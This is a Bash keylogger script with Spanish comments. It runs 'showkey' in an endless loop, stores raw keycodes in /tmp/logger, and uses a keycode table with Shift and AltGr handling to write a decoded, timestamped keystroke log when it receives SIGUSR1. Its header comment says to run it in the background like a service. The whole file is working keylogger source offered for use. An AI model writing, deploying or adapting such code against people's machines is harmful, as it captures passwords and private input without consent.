#!/bin/bash

:<<EOF
	...poner en ejecucion el keylogger en background, como un servicio...
	y para generar fichero log, mandar señal SIGUSR1 al mismo: kill -s SIGUSR1 `ps -C keylogger_bash.sh -o pid --no-headers`

	v.1.0
EOF
declare -A teclas=(
["01"]="<ESC>"
["02"]=1
["03"]=2
["04"]=3
["05"]=4
["06"]=5
["07"]=6
["08"]=7
["09"]=8
["10"]=9
["11"]=0
["12"]="<minus>"
["13"]="<equal>"
["14"]="<BackSpace>"
["15"]="<Tab>"
["16"]=q
["17"]=w
["18"]=e
["19"]=r
["20"]=t
["21"]=y
["22"]=u
["23"]=i
["24"]=o
["25"]=p
["26"]="Bracketleft"
["27"]="Bracketright"
["28"]="Return(enter)"
["29"]="Control_L"
["30"]=a
["31"]=s
["32"]=d
["33"]=f
["34"]=g
["35"]=h
["36"]=j
["37"]=k
["38"]=l
["39"]=")"
["40"]="Apostrophe"
["41"]="º"
["42"]="<Shift_L>"
["43"]="Backslash(\)"
["44"]=z
["45"]=x
["46"]=c
["47"]=v
["48"]=b
["49"]=n
["50"]=m
["51"]=","
["52"]="."
["53"]="-"
["54"]="<Shift_R>"
["55"]="KP_Multiply"
["56"]="<Alt_key>"
["57"]="<Space( )>"
["58"]="<Caps_Lock>"
["59"]=F1
["60"]=F2
["61"]=F3
["62"]=F4
["63"]=F5
["64"]=F6
["65"]=F7
["66"]=F8
["67"]=F9
["68"]=F10
["69"]="<Num_Lock>"
["70"]="<Scroll_Lock>"
["71"]=KP_Home
["72"]=KP_Up
["73"]=KP_Prior
["74"]=KP_Subtract
["75"]=KP_Left
["76"]=KP_Begin
["77"]=KP_Right
["78"]=KP_Add
["79"]=KP_End
["80"]=KP_Down
["81"]=KP_Next
["82"]=KP_Insert
["83"]=KP_Delete
["86"]="less"
["87"]=F11
["88"]=F12EOF
["100"]="<AltGraph>"
["102"]="|"
["103"]="@"
["104"]="#"
["105"]="~"
["106"]="½"
["107"]="¬"
["108"]="{"
["109"]="["
["110"]="]"
["111"]="}"
["126"]="["
["127"]="]"
["140"]="{"
["141"]="\\"
["143"]="}"
["156"]="!"
["157"]='"'
["158"]="·"
["159"]="$"
["160"]="%"
["161"]="&"
["162"]="/"
["163"]="("
["164"]=")"
["165"]="="
)


	FILESHOWKEY=${1:-/tmp/logger}
        function convertir() {
		local FILE=/tmp/teclas_`date +%d"-"%m"-"%Y"-"%H"."%M`
		echo "================ `date +\"hora...\"%H\":\"%M\":\"%S\" , dia...\"%d\" \"%B\" \"%Y`==============================" >> $FILE
		while read t estado
		do
			case $t in 
				42|54) [ "$estado" = "pulsada" ] && SHIFT=true || SHIFT=false ;;
				58) [ "$estado" = "pulsada" ] && echo -n " <CAPS o MAYS Pulsado> " >> $FILE || echo -n " <CAPS o MAYS liberado> " >> $FILE ;;
				28) [ "$estado" = "pulsada" ] && echo -e "\n" >> $FILE ;;
				57) echo -n " " >> $FILE ;;
				100) [ "$estado" = "pulsada" ] && altgraph=true || altgraph=false ;;
				14) [ "$estado" = "pulsada" ] && echo -n -e "\033[1D" >> $FILE ;;
				[2-9]|1[01]|4[013]|2[67])
					  if [ "$estado" = "pulsada" ]
					  then
					      [ "$altgraph" = "true" ] && { echo -n "${teclas[`expr 100 + $t`]}" >> $FILE; continue; }
					      [ "$SHIFT" = "true" ] && { echo -n "${teclas[`expr 154 + $t`]}" >> $FILE; continue; }

  					      [ $t -lt 10 ] && echo -n "${teclas[0$t]}" >> $FILE || echo -n "${teclas[$t]}" >> $FILE
					  fi
					 ;;
				*) [ "$estado" = "pulsada" ] && echo -n "${teclas[$t]}" >> $FILE ;;		
			esac
	
		done < <(cat $FILESHOWKEY  | grep -i -e ".*\(pulsada\|liberada\)$" | awk '{print $4" "$5}')
        }

	trap convertir SIGUSR1
	while true
	do
		showkey >> $FILESHOWKEY
	done



